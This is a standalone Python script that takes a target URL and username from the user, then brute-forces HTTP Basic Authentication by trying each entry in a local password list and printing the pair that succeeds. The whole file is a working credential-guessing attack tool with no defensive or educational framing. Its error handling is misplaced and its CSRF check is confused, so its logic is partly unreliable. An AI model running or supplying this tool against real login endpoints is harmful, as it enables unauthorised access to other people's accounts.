import requests
from requests.auth import HTTPBasicAuth

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")

try:
    def bruteCracking(username, url):
        for password in passwords:
            password = password.strip()
            print("Trying:" + password)
            response = requests.get(
                url, auth=HTTPBasicAuth(username, password))
            if response.status_code != 200:
                pass
            elif "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteForce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username, url)

print("Password not found in password list")
